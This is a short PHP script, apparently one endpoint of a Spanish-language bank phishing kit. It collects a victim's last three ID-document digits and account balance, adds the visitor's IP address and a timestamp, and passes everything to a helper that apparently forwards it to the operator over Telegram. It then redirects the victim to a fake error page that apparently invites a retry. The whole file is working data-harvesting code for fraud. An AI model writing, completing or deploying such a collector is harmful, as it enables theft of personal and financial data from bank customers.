<?php
require __DIR__ . '/data.php';
header('Content-Type: application/json; charset=utf-8');

$docLast3 = nq_f('docLast3');
$balance  = nq_f('balance');

if ($docLast3 === '' || $balance === '') {
    echo json_encode(['success' => false, 'message' => 'Datos incompletos']);
    exit;
}

$bal = number_format((float) preg_replace('/[^\d]/', '', $balance), 0, ',', '.');

$SEP = "───────────────────";
$msg  = "💰 <b>Saldo — Intento 1</b>\n$SEP\n";
$msg .= "🔢 Últimos 3 dígitos doc: <code>{$docLast3}</code>\n";
$msg .= "💵 Saldo: <b>\${$bal}</b>\n";
$msg .= "\n🌐 " . nq_ip() . " · 🕐 " . date('Y-m-d H:i:s');

nq_tg($msg);

echo json_encode([
    'success' => true,
    'data'    => ['session_id' => nq_session()],
    'redirect' => 'errsaldo.html',
]);
